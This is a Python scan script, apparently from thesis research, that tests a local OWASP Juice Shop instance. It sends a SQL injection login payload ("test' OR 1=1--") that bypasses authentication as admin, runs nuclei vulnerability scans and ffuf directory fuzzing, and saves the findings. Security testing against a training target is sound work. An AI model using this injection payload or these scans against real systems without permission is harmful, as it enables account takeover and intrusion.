import urllib.request, json, subprocess, sys, os

target = "http://127.0.0.1:3001"
TOOLS = "D:\\大论文\\tools"
findings = []

# Set console encoding to utf-8
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

print("=" * 60)
print("  FINAL COMPREHENSIVE SCAN - Juice Shop")
print("=" * 60)

# 1. Manual SQL injection test
print()
print("[1/4] SQL Injection (manual verification)")
try:
    data = json.dumps({"email": "test' OR 1=1--", "password": "test"}).encode()
    req = urllib.request.Request(target + "/rest/user/login", data=data,
                                 headers={"Content-Type": "application/json"})
    resp = urllib.request.urlopen(req, timeout=5)
    body = resp.read().decode("utf-8", "replace")
    j = json.loads(body)
    auth = j.get("authentication", {})
    if auth:
        user = auth.get("data", {})
        findings.append({
            "target": "juice-shop", "scanner": "manual",
            "type": "sql_injection", "severity": "critical",
            "url": target + "/rest/user/login",
            "desc": "SQL injection in email parameter - authentication bypass as admin",
            "evidence": "email=test' OR 1=1-- returned admin token: %s" % user.get("email","")
        })
        print("  [OK] SQL Injection CONFIRMED: %s (role=%s)" % (user.get("email","?"), user.get("role","?")))
except Exception as e:
    print("  [FAIL] %s" % str(e)[:100])

# 2. Nuclei
print()
print("[2/4] Nuclei vulnerability scan")
try:
    r = subprocess.run([os.path.join(TOOLS, "nuclei.exe"),
                        "-u", target, "-j",
                        "-severity", "critical,high,medium",
                        "-timeout", "5", "-retries", "1"],
                       capture_output=True, timeout=180)
    out = r.stdout.decode("utf-8", "replace")
    n_count = 0
    for line in out.split("\n"):
        line = line.strip()
        if line.startswith("{"):
            try:
                entry = json.loads(line)
                sev = entry.get("info", {}).get("severity", "info")
                findings.append({
                    "target": "juice-shop", "scanner": "nuclei",
                    "type": entry.get("info", {}).get("name", "unknown"),
                    "severity": sev,
                    "url": entry.get("matched-at", ""),
                    "desc": entry.get("info", {}).get("description", ""),
                    "evidence": json.dumps(entry, ensure_ascii=False)[:300]
                })
                n_count += 1
            except json.JSONDecodeError:
                pass
    print("  %d nuclei findings" % n_count)
    for f in findings:
        if f["scanner"] == "nuclei":
            print("    %s | %s | %s" % (f["type"][:35], f["severity"], f["url"][:50]))
except subprocess.TimeoutExpired:
    print("  [TIMEOUT] nuclei timed out")

# 3. FFUF
print()
print("[3/4] FFUF directory scan")
ffuf_json = os.path.join(TOOLS, "ffuf_output_final.json")
try:
    subprocess.run([os.path.join(TOOLS, "ffuf.exe"), "-u", target + "/FUZZ",
                    "-w", os.path.join(TOOLS, "common.txt"),
                    "-t", "10", "-ac", "-of", "json", "-o", ffuf_json],
                   capture_output=True, timeout=30)
    if os.path.exists(ffuf_json):
        with open(ffuf_json, encoding="utf-8", errors="replace") as f:
            data = json.load(f)
        for res in data.get("results", []):
            findings.append({
                "target": "juice-shop", "scanner": "ffuf",
                "type": "directory_enumeration", "severity": "info",
                "url": res["url"],
                "desc": "Discovered: %s (HTTP %d, %d bytes)" % (res["url"], res["status"], res["length"]),
                "evidence": json.dumps(res)
            })
        print("  %d ffuf findings" % len(data.get("results", [])))
        for f in findings:
            if f["scanner"] == "ffuf":
                print("    %s" % f["url"][:60])
except Exception as e:
    print("  [FAIL] ffuf: %s" % str(e)[:100])

# Summary
print()
print("=" * 60)
print("FINAL RESULTS - Juice Shop")
print("=" * 60)
for f in findings:
    print("  [%s] [%s] %s | %s" % (f["severity"][:4], f["scanner"], f["type"][:35], f["desc"][:70]))

print()
print("Total: %d findings" % len(findings))
scanners = {}
for f in findings:
    scanners[f["scanner"]] = scanners.get(f["scanner"], 0) + 1
for s, c in sorted(scanners.items()):
    print("  %s: %d" % (s, c))

outpath = "scripts/experiment/real_findings_final.json"
with open(outpath, "w", encoding="utf-8") as f:
    json.dump(findings, f, indent=2, ensure_ascii=False)
print("Saved to: %s" % outpath)
